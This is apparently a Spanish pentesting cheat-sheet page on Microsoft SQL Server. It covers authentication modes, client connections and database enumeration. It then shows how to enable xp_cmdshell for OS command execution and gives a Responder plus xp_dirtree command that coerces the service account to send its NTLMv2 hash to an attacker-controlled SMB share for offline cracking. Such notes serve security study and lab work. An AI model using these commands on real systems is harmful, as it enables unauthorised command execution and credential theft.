+++
title = 'MSSQL'
draft = false
description = "Explicación del funcionamiento del protocolo MSSQL"
tags = ["MSSQL", "Protocolo"]
showToc = true
showRelatedContent = false
+++

# Microsoft SQL

## Resumen

Base de datos y protocolo de Microsoft, closed source.

* Puerto **TCP 1433, 2433**.

Tiene 2 modos de autenticación, el modo "*Windows*" y el modo "*mixto*".
- **Windows**: Las cuentas con las que se inicia sesión son las de Windows. MSSQL delega y confía en la autenticación realizada por el SO (O por AD). Activado por defecto, más seguro.
- **Mixto**: Hay tanto cuentas de Windows como cuentas que solo existen en el entorno de MSSQL. Útil para cuando se hacen conexiones con terceros.

## Conexión
- Desde **Windows**:
  - Es posible conectarse con la aplicación cliente oficial **SMSS**, es posible encontrarla instalada en alguna máquina vulnerada (con, posiblemente, credenciales a alguna cuenta)
  - También podemos usar `sqlcmd` en el CLI.
- Desde **Linux** podemos usar `Impacket-mssqlclient` o `sqsh` (CLI) y [`dbeaver`](https://github.com/dbeaver/dbeaver) (GUI)
```bash
mssqlclient.py dominio/admin:password@10.10.11.87 -port 1433
```
```bash
sqsh -S 10.10.11.87 -U admin -P password
```

## Enumeración de Mode de Auth
Para conocer el modo de autenticación (windows/mixto) necesitaremos una cuenta en el servidor SQL, no tiene por qué ser privilegiada, dado que cualquier usuario, por defecto, tiene el rol `public` y tiene permiso para ver las propiedades básicas del servidor. Necesitamos este query:
```sql
SELECT SERVERPROPERTY('IsIntegratedSecurityOnly');
```
Desde `dbeaver`: **Click derecho al nodo mayor** > **SQL Editor** > **New SQL Script** y escribimos como esto, guardando el resultado en una variable, luego lo ejecutamos. P.ej:
```sql
SELECT SERVERPROPERTY('IsIntegratedSecurityOnly') AS ModoAuth;
```

Según el valor de retorno:
- **`0`**: Modo mixto
- **`1`**: Modo Windows


## Listado de DBs y Tablas
Para listar bases de datos:
```mssql
SELECT name FROM sys.databases;
```

Para listar tablas en esa base de datos:
```mssql
use database3;
SELECT name FROM sys.tables;
```


## Ejecución de comandos
MSSQL dispone de un método para ejecutar comandos en el servidor, con los mismos privilegios con los que se ejecuta el proceso de mssql, este método es `xp_cmdshell`.

```sql
xp_cmdshell 'comando'
GO

-- O alternativamente:

EXEC xp_cmdshell 'comando';
```

Si `xp_cmdshell` está desactivado, podemos activarlo así:
```
-- Permitir edición de ajustes avanzados (que suelen estar ocultos)
EXECUTE sp_configure 'show advanced options', 1
GO
-- Actualizar configuración sin tener que reiniciar el server
RECONFIGURE
GO  
-- Habilitar xp_cmdshell
EXECUTE sp_configure 'xp_cmdshell', 1
GO  
-- Actualizar configuración sin tener que reiniciar el server
RECONFIGURE
GO
```

O también:
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

**Impacket-mssqlclient** tiene un "macro" que automatiza el (des)activar `xp_cmdshell`:
```sql
-- Usando mssqlclient.py como cliente
SQL (htbdbuser  guest@tempdb)> enable_xp_cmdshell
```

## Robo de Hash con **`XP_DIRTREE`**
`xp_dirtree` es un comando de `mssql` que permite listar los archivos en un share SMB.
El problema de este procedimiento es que para conectarse a ese share SMB:
- El servicio MSSQL necesitará privilegios elevados de la DB para comunicarse por la red
- Tendrá que compartir su hash NTLMv2 para autenticarse en SMB
Esto implica que, si con `responder` (u otro programa) creamos un share SMB falso y desde una cuenta no privilegiada de MSSQL nos tratamos de conectar, podremos conseguir el hash de la cuenta de servicio del servidor SQL

```bash
sudo responder -I eth0
...
[+] Listening for events...
```
Y desde el servidor SQL:
```mssql
EXEC master..xp_dirtree '\\IP_ATACANTE\Share';
```
En `Responder` veremos:
```bash
...
[SMB] NTLMv2-SSP Client   : 10.10.11.87
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:aa4b2... [resto del hash]
```
Ese `NTLMv2-SSP Hash` podremos crackearlo offline
